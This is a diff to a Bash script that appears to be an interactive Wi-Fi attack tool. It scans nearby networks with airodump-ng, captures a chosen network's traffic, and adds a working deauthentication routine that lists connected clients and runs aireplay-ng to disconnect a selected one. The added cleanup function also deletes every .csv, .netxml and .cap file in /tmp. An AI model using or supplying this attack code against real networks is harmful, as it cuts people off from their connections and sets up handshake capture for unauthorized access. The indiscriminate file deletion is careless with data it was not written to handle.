@@ -133,31 +133,46 @@ trim() {
 
 function list_network()
 {
-   rm -f /tmp/wifi* 2>/dev/null
+   cleanup
    airodump-ng ${WIFI_INTERFACE} --write /tmp/wifi
 }
 
-function view_network()
+function _select_network()
 {
     local wifi_networks=( $(cat /tmp/wifi-01.csv | tail -n +3 | awk '{print $NF}' |egrep -o "^[a-zA-Z0-9_\-]{3,100}" |grep -v "ESSIDs" | xargs) )
-
+    
+    clear
+    print_banner
     echo ""
 
     for i in "${!wifi_networks[@]}"; do 
         printf "${LIGHTWHITE}[${LIGHTRED}%s${LIGHTWHITE}] %s\n" "$i" "${wifi_networks[$i]}"
     done
-
+    
     color.green "${BOLD}"
     echo -n "➜ " 
     read i
     export WIFI_NETWORK="${wifi_networks[$i]}"
     echo ""
-
+    
     local bssid=$(cat /tmp/wifi-01.csv |egrep ${WIFI_NETWORK} |awk '{print $1}' |tr -d ',' | xargs)
     export BSSID=${bssid}
-
+    
     local channel=$(cat /tmp/wifi-01.csv |egrep ${WIFI_NETWORK} |awk -F',' '{print $4}' | xargs)
     export CHANNEL=${channel}
+}
+
+function cleanup()
+{
+   rm -f /tmp/*.csv 2>/dev/null
+   rm -f /tmp/*.netxml 2>/dev/null
+   rm -f /tmp/*.cap 2>/dev/null
+}
+
+
+function view_network()
+{
+    _select_network
 
     # Do the magic
     ( cd /tmp && airodump-ng -w ${WIFI_NETWORK} --bssid ${BSSID} -c ${CHANNEL} ${WIFI_INTERFACE} )
@@ -165,9 +180,28 @@ function view_network()
 
 function deauth_network()
 {
-       echo "deauth network"
-}
+    view_network
+    #local wifi_clients=( $(IFS=$'\n' cat /tmp/${WIFI_NETWORK}-01.csv |grep -A50 "Station MAC" |tail -n -3) )
+    local wifi_clients=( $(cat /tmp/${WIFI_NETWORK}-01.csv |grep -A10 'Station MAC' | awk -F ',' '{print $1}' |grep -v "Station" |xargs) )
 
+    echo ""
+
+    for i in "${!wifi_clients[@]}"; do 
+        printf "${LIGHTWHITE}[${LIGHTRED}%s${LIGHTWHITE}] %s\n" "$i" "${wifi_clients[$i]}"
+    done
+
+    color.green "${BOLD}"
+    echo -n "➜ " 
+    read i
+    export WIFI_CLIENT="${wifi_clients[$i]}"
+    echo ""
+	
+    local station_mac=$(cat /tmp/${WIFI_NETWORK}-01.csv |grep "${WIFI_CLIENT}" |awk -F',' '{print $6}' |xargs)
+    export STATION_MAC=${station_mac}    	
+
+    aireplay-ng --deauth 30 -a ${STATION_MAC} -c ${WIFI_CLIENT} ${WIFI_INTERFACE}
+
+}
 
 
 function print_banner()
